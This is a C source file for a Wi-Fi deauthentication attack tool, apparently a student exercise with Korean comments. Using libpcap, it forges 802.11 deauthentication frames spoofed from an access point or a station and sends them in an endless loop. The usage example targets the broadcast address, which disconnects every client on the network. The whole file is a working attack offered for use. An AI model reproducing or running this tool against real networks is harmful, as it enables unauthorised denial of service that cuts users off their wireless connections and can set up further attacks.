#include <pcap.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>

struct Radio
{
    uint8_t version; /* set to 0 */
    uint8_t pad;
    uint16_t len;     /* entire length */
    uint32_t present; /* fields present */
};                    // size of 8

struct DeauthHd
{
    u_short FcF;
    u_short Dur;
    u_char STAMac[6];
    u_char APMac[6];
    u_char BSSID[6];
    u_short FSnumber;
};
struct DeauthBd
{
    u_short Rcode;
};

struct DeAuthentication
{
    struct Radio rad;
    struct DeauthHd Dth;
    struct DeauthBd Dtb;
};

void usage()
{
    printf("syntax: deauth_attack <interface> <AP mac> <STA mac> <Src add (AP or STA)>\n");
    printf("sample: deauth_attack wlan0 11:22:33:44:55:66 ff:ff:ff:ff:ff:ff AP\n");
}

typedef struct
{
    char *dev_;
} Param;

Param param = {
    .dev_ = NULL};

bool parse(Param *param, int argc, char *argv[])
{
    if (argc != 5)
    {
        usage();
        return false;
    }
    param->dev_ = argv[1];
    return true;
}

void Mac_(const char *arr, u_char mac_addr[6]);

int main(int argc, char *argv[])
{

    if (!parse(&param, argc, argv))
        return -1;

    unsigned char *Interface = argv[1];
    unsigned char *AP_MAC = argv[2];
    unsigned char *STA_MAC = argv[3];
    unsigned char *Src_add = argv[4];

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *pcap = pcap_open_live(Interface, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL)
    {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
        return -1;
    }

    struct DeAuthentication packet;
    //패킷 초기화 진행
    packet.rad.len = 0x0008;
    packet.Dth.FcF = 0x00C0; // 0xC000
    packet.Dth.Dur = 0x0;

    
    if(strcmp(Src_add,"AP")==0){
    Mac_(AP_MAC, packet.Dth.STAMac);
    Mac_(STA_MAC, packet.Dth.APMac);
    Mac_(AP_MAC, packet.Dth.BSSID);
    packet.Dth.FSnumber = 0x0;
    packet.Dtb.Rcode = 0x0003;
    }
    else if(strcmp(Src_add,"STA")==0){
    Mac_(AP_MAC, packet.Dth.APMac);
    Mac_(STA_MAC, packet.Dth.STAMac);
    Mac_(AP_MAC, packet.Dth.BSSID);
    packet.Dth.FSnumber = 0x0;
    packet.Dtb.Rcode = 0x0007;
    }
    else{
        printf("Src add Error!!\n");
        return 0;
    }
    
    //패킷 전송
    while (1)
    {
        if (pcap_sendpacket(pcap, (char *)&packet, sizeof(packet) - 2) != 0)
        {
            fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(pcap));
            return -1;
        }
    }
    pcap_close(pcap);
}

void Mac_(const char *arr, u_char mac_addr[6])
{
    int a;
    if (strlen(arr) != 17)
    {
        printf("Maclen error!!\n");
    }
    char cpyarr[18];
    memcpy(cpyarr, arr, 17);
    for (int i = 0; i < 6; i++) //입력Mac값의 콜론 제거
    {
        cpyarr[i * 3 + 2] = '\0';
        sscanf((const char *)&cpyarr[3 * i], "%x", &a);
        mac_addr[i] = (u_char)a;
    }
}

